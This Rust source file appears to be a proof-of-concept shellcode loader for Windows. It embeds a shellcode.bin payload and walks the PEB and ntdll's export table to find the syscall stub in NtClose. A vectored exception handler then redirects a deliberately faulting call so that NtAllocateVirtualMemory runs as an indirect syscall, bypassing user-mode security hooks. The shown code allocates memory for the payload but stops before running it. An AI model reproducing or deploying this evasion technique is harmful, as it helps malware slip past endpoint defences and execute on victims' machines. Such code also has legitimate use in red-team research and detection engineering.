use std::{ffi::CStr, mem::transmute, os::raw::c_void, ptr::null_mut};

use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
use windows_sys::Win32::{
    Foundation::EXCEPTION_ACCESS_VIOLATION,
    System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH,
            EXCEPTION_DEBUG_INFO, EXCEPTION_POINTERS, IMAGE_NT_HEADERS64,
        },
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
        SystemServices::{
            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
            SID_HASH_SIZE,
        },
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
static mut SYSCALL_ADDR: *mut c_void = null_mut();

type NtAllocateVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: *mut c_void,
    BaseAddress: *mut *mut c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> i32;

fn get_current_teb() -> PTEB {
    unsafe {
        let mut teb: PTEB = null_mut();
        #[cfg(target_arch = "x86_64")]
        std::arch::asm!(
            "mov {}, gs:[0x30]",
            out(reg) teb
        );
        #[cfg(target_arch = "x86")]
        std::arch::asm!(
            "mov {}, fs:[0x18]",
            out(reg) teb
        );
        teb
    }
}

fn find_sysaddr(function_name: &str, sys_addr: &mut *mut c_void) {
    unsafe {
        let teb = get_current_teb();
        let peb = (*teb).ProcessEnvironmentBlock;

        if teb.is_null() || peb.is_null() || (*peb).OSMajorVersion != 10 {
            print!("[-] Invalid PEB");
            return;
        }

        let ldr_data_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;
        let ntdll_base = (*ldr_data_entry).DllBase;
        println!("[+] ntdll.dll base address: {:?}", ntdll_base);

        let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            print!("[-] Invalid DOS header");
            return;
        }

        let nt_headers = (ntdll_base as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            print!("[-] Invalid NT header");
            return;
        }

        let export_dir = (ntdll_base as *const u8)
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *const IMAGE_EXPORT_DIRECTORY;

        let address_of_functions =
            (ntdll_base as *const u8).add((*export_dir).AddressOfFunctions as usize) as *const u32;
        let address_of_names =
            (ntdll_base as *const u8).add((*export_dir).AddressOfNames as usize) as *const u32;
        let address_of_name_ordinals = (ntdll_base as *const u8)
            .add((*export_dir).AddressOfNameOrdinals as usize)
            as *const u16;

        for i in 0..(*export_dir).NumberOfNames as isize {
            let name =
                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;

            let ordinal = *address_of_name_ordinals.offset(i) as usize;

            if ordinal >= (*export_dir).NumberOfFunctions as usize {
                continue;
            }

            let func_rva = *address_of_functions.offset(ordinal as isize);
            let func_addr = (ntdll_base as *const u8).add(func_rva as usize);

            let c_str = CStr::from_ptr(name);

            if let Ok(func_name) = c_str.to_str() {
                if function_name.eq_ignore_ascii_case(func_name) {
                    println!("[+] Found {} at address: {:?}", func_name, func_addr);

                    let bytes = func_addr as *const u8;

                    for i in 0..32 {
                        if *bytes.offset(i) == 0x4c
                            && *bytes.offset(i + 1) == 0x8b
                            && *bytes.offset(i + 2) == 0xd1
                            && *bytes.offset(i + 3) == 0xb8
                            && *bytes.offset(i + 6) == 0x00
                            && *bytes.offset(i + 7) == 0x00
                        {
                            let low = *bytes.offset(i + 4) as u32;
                            let high = *bytes.offset(i + 5) as u32;

                            // ssn = ((high << 8) | low) as i32;
                            *sys_addr = func_addr.add(18 as usize) as *mut c_void;

                            // println!("[+] {} has SSN: {}", func_name, ssn);
                            println!("[+] Syscall address: {:?}", *sys_addr);
                            return;
                        }
                    }
                }
            }
        }
    }
    // ssn
}

unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        if (*(*exception_info).ExceptionRecord).ExceptionCode == EXCEPTION_ACCESS_VIOLATION {
            println!(
                "Access violation at address: {:?}",
                (*(*exception_info).ExceptionRecord).ExceptionAddress
            );
            (*(*exception_info).ContextRecord).R10 = (*(*exception_info).ContextRecord).Rcx;
            (*(*exception_info).ContextRecord).Rax = (*(*exception_info).ContextRecord).Rip;

            (*(*exception_info).ContextRecord).Rip = SYSCALL_ADDR as u64;

            (*(*exception_info).ContextRecord).EFlags |= 0x10000;

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        return EXCEPTION_CONTINUE_SEARCH;
    }
}

fn main() {
    unsafe {
        let mut sys_addr = null_mut();
        find_sysaddr("NtClose", &mut sys_addr);

        let ssn = 0x18;

        SYSCALL_ADDR = sys_addr;

        let NtAllocateVirtualMemory: NtAllocateVirtualMemory = transmute(ssn as *mut c_void);

        let mut base_address: *mut c_void = null_mut();
        let mut size = SHELLCODE.len();

        AddVectoredExceptionHandler(1, Some(exception_handler));

        let status = NtAllocateVirtualMemory(
            -1isize as *mut c_void,
            &mut base_address,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if status != 0 {
            println!("[-] Failed to allocate memory");
            return;
        }

        println!(
            "[+] Allocated {} bytes at {:p}",
            SHELLCODE.len(),
            base_address
        );
    }
}
